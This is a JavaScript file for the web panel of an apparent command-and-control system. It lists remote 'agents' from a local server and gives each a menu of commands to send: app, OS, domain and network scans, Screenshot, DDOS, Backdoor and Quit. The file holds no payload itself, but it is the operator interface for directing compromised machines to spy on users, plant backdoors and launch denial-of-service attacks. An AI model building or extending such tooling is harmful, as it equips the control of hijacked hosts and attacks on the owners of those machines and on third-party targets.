document.addEventListener('DOMContentLoaded', () => {
    fetch('http://127.0.0.1:5000/agents') // Replace with your actual API endpoint
        .then(response => response.json())
        .then(data => {
            const container = document.getElementById('container');
            Object.keys(data).forEach(host => {
                // Create main button
                const button = document.createElement('button');
                button.textContent = host;
                button.addEventListener('click', () => {
                    const dropdown = button.nextElementSibling;
                    dropdown.style.display = dropdown.style.display === 'none' ? 'block' : 'none';
                });

                // Create dropdown menu
                const dropdown = document.createElement('div');
                dropdown.className = 'dropdown';

                // Create dropdown buttons
                ['Scan Apps', 'Scan OS', 'Scan Domain', 'Scan Net', 'Screenshot', 'DDOS', 'Backdoor', 'Quit'].forEach(action => {
                    const actionButton = document.createElement('button');
                    actionButton.textContent = action;
                    actionButton.addEventListener('click', () => {
                        const command = action.toLowerCase().replace(/\s+/g, ''); // Format command name
                        fetch(`http://127.0.0.1:5000/addInstruction/${host}/${command}`, {
                            method: 'POST' // Assuming this requires a POST request
                        })
                        .then(response => {
                            if (!response.ok) {
                                throw new Error('Network response was not ok');
                            }
                            alert(`Command "${action}" sent to agent "${host}"`);
                        })
                        .catch(error => {
                            console.error('Error sending command:', error);
                        });
                    });
                    dropdown.appendChild(actionButton);
                });

                // Append button and dropdown to container
                container.appendChild(button);
                container.appendChild(dropdown);
            });
        })
        .catch(error => {
            console.error('Error fetching data:', error);
        });
});
